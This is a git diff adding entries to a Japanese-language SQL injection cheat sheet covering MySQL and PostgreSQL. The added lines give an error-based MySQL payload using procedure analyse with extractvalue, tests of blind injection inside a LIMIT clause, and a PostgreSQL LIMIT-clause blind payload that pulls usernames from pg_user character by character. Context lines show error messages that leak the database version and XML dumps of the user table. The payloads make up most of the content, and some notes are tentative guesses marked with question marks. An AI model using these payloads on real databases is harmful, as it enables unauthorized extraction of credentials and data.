@@ -71,12 +71,30 @@ https://murashun.jp/article/programming/regular-expression.html
 ## キーワード
 ### MySQL
 - `SELECT 'Ä'='a'`はTrueとなる。  
+- 5.6以上では`limit 1,1 procedure analyse(extractvalue(0,concat(0x3a,version())),1);`というError Basedが使えないらしい？  
+https://www.mbsd.jp/blog/20160909.html  
+MySQLではLIMIT句のBlindはできない？？？？  
+postgresではできるけど…  
+```txt
+// test 1 が返る
+SELECT name,substr((select version()),1,1) FROM demo LIMIT 0,1
+SELECT name,if(1=1, 1, 1) FROM demo LIMIT 0,1
+SELECT name,(case when 1=1 then 1 else 0 end) FROM demo LIMIT 0,1
+
+// MySQL error が返る
+SELECT name,substr((select version()),1,1) FROM demo LIMIT 0,substr((select version()),1,1)
+SELECT name,if(1=1, 1, 1) FROM demo LIMIT 0,if(1=1, 1, 1)
+SELECT name,(case when 1=1 then 1 else 0 end) FROM demo LIMIT 0,(case when 1=1 then 1 else 0 end)
+```
 ### PostgreSQL
 - `select (CASE WHEN ((SELECT CAST(CHR(32)||(SELECT version()) AS NUMERIC))='1') THEN 2 ELSE 3 END)`  
 で以下のようなError文に結果が含まれた出力を返す。  
 ```txt
 22P02 invalid input syntax for type numeric: " PostgreSQL 12.4 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 8.3.1 20191121 (Red Hat 8.3.1-5), 64-bit"
 ```
+- `SELECT id,version() FROM demo limit (CASE WHEN 1=1 THEN 1 ELSE 0 END)`でLIMIT句内にInjectできる場合はBlindが可能！  
+LIMIT句内にInjectできる場合はUNIONとかは使えない。  
+実際は`SELECT id,version() FROM demo limit (CASE WHEN (SELECT ascii(substr(usename, 0, 1)) FROM pg_user LIMIT 1) = 99 THEN 1 ELSE 0 END)`とかみたいにするっぽい。  
 - `select query_to_xml('select * from pg_user',true,true,'');`  
 でXML形式で出力を返す。  
 - `select database_to_xml(true,true,'');`  
